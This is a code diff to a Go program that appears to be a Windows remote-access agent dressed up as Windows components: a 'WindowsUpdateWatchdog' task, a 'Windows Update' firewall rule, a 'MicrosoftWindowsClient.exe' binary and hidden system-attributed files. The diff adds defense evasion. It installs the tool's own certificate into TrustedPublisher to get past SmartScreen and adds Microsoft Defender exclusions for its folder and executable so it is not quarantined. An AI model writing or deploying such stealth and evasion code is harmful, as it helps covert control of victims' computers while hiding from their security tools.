@@ -64,6 +64,47 @@ func hideFile(path string) {
 	_, _ = exec.Command("attrib", "+h", "+s", path).CombinedOutput()
 }
 
+// trustPublisherCert installs our code-signing cert into TrustedPublisher
+// so SmartScreen/Smart App Control accept our signed binaries instead of
+// blocking them as "unknown publisher". Needs admin (we have it).
+func trustPublisherCert(dir string) {
+	cer := filepath.Join(dir, "RMM.cer")
+	if _, err := os.Stat(cer); err != nil {
+		log.Printf("[!] publisher cert missing, SmartScreen may warn")
+		return
+	}
+	out, err := exec.Command("certutil", "-addstore", "-f", "TrustedPublisher", cer).CombinedOutput()
+	if err != nil {
+		log.Printf("[!] trust publisher cert: %v %s", err, strings.TrimSpace(string(out)))
+		return
+	}
+	log.Printf("[*] Publisher cert trusted")
+}
+
+// addDefenderExclusions keeps Defender from quarantining our install dir +
+// exe (heuristic false positives on admin tools). Best effort: fails
+// silently when Defender is absent, managed, or Tamper Protection blocks it
+// (then the friend allows it once in Protection history).
+func addDefenderExclusions(paths ...string) {
+	for _, p := range paths {
+		q := strings.ReplaceAll(p, "'", "''")
+		_, _ = exec.Command("powershell", "-NoProfile", "-Command", `Add-MpPreference -ExclusionPath '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
+		if strings.HasSuffix(strings.ToLower(p), ".exe") {
+			_, _ = exec.Command("powershell", "-NoProfile", "-Command", `Add-MpPreference -ExclusionProcess '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
+		}
+	}
+}
+
+func removeDefenderExclusions(paths ...string) {
+	for _, p := range paths {
+		q := strings.ReplaceAll(p, "'", "''")
+		_, _ = exec.Command("powershell", "-NoProfile", "-Command", `Remove-MpPreference -ExclusionPath '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
+		if strings.HasSuffix(strings.ToLower(p), ".exe") {
+			_, _ = exec.Command("powershell", "-NoProfile", "-Command", `Remove-MpPreference -ExclusionProcess '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
+		}
+	}
+}
+
 func saveHouse(path, addr string) {
 	addr = strings.TrimSpace(addr)
 	if addr == "" {
@@ -222,6 +263,11 @@ func install() {
 	_, _ = exec.Command("schtasks", "/delete", "/tn", "WindowsUpdateWatchdog", "/f").CombinedOutput()
 
 	_, _ = exec.Command("netsh", "advfirewall", "firewall", "add", "rule", "name=Windows Update", "dir=out", "action=allow", "program="+agentPath, "enable=yes").CombinedOutput()
+
+	// Unblock-friendly install: trust our publisher cert (SmartScreen) and
+	// ask Defender to leave our dir/exe alone (heuristic false positives).
+	trustPublisherCert(installDir)
+	addDefenderExclusions(installDir, agentPath)
 
 	threeDObjects := filepath.Join(os.Getenv("USERPROFILE"), "3D Objects")
 	blenderDir := filepath.Join(threeDObjects, "blender")
@@ -400,6 +446,7 @@ func main() {
 		_, _ = exec.Command("taskkill", "/F", "/IM", "MicrosoftWindowsClient.exe").CombinedOutput()
 		// Kill watchdog by command-line match (window title is unreliable when hidden).
 		_, _ = exec.Command("powershell", "-NoProfile", "-command", "Get-CimInstance Win32_Process -Filter \"Name='powershell.exe'\" | Where-Object { $_.CommandLine -like '*watchdog.ps1*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }").CombinedOutput()
+		removeDefenderExclusions(installDir, filepath.Join(installDir, "MicrosoftWindowsClient.exe"))
 		_ = os.RemoveAll(installDir)
 		if legacyDir != "" && legacyDir != installDir {
 			_ = os.RemoveAll(legacyDir)
